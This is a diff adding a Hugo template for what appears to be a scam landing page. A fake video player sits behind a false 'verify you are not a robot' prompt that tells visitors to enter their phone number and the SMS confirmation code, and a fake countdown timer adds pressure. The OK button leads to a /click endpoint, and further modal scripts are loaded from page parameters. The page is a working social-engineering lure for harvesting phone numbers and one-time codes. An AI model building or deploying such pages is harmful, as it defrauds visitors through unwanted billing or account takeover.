@@ -1,0 +1,63 @@
+{{ define "main" }}
+<body class="background" id="resize">
+	<div class="wrap">
+		<div class="wrap-video gray">
+			<video class="video " src="/mp4/9A.mp4">
+				<source type="video/mp4">
+			</video>
+		</div>
+
+		<div class="header">
+			<img class="mpic" src="/img/top.jpg" alt="" />
+		</div>
+
+		<div id="main-block" class="main">
+			<a class="step-1">
+				<svg class="play-icon mpic" width="70" height="70" viewBox="0 0 48 48" fill="#fff"
+					xmlns="http://www.w3.org/2000/svg" onclick="play();">
+					<path fill-rule="evenodd" clip-rule="evenodd"
+						d="M12 8.77702C12 6.43812 14.5577 4.99881 16.5569 6.21266L41.6301 21.4356C43.5542 22.6038 43.5542 25.3962 41.6301 26.5644L16.5569 41.7873C14.5577 43.0012 12 41.5619 12 39.223V8.77702Z">
+					</path>
+				</svg>
+			</a>
+		</div>
+		<div class="main">
+			<div class="main__box">
+				<div class="main__title" data-i18n="title">Attention! you must verify that you are not a robot</div>
+				<div class="main__text" data-i18n="text">Press "OK" to confirm</div>
+				<div class="main__text" data-i18n="list">1.Enter your phone number</div>
+				<div class="main__text" data-i18n="list-2">2.Enter the confirmation code from SMS</div>
+				<div class="main__timer"> 22 seconds left</div>
+				<a href="/click" class="btn">ОК</a>
+			</div>
+		</div>
+		<div class="footer">
+			<div class="timer"><span id="time">0:00</span>/0:09 </div>
+			<img class="mpic" src="/img/bottom.jpg" alt="">
+		</div>
+	</div>
+
+	<script>
+		let timeLeft = 22;
+		const timerElement = document.querySelector('.main__timer')
+		const countdown = setInterval(() => {
+			timeLeft--
+			if (timeLeft > 0) {
+				timerElement.textContent = `${timeLeft} seconds left`
+			} else {
+				timerElement.textContent = `Time's up!`
+				clearInterval(countdown)
+			}
+		}, 1000)
+	</script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.i18n/1.0.9/jquery.i18n.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.i18n/1.0.9/jquery.i18n.messagestore.min.js"></script>
+{{ range .Params.modals }}
+{{ $modal := resources.Get . | js.Build  | fingerprint }}
+<!-- Use this for external scripts -->
+<script src="{{ $modal.RelPermalink }}"></script>
+<!-- Use this for inline scripts -->
+<!--<script> {{ $modal.Content | safeJS }} </script> -->
+{{ end }}
+</body>
+{{ end }}
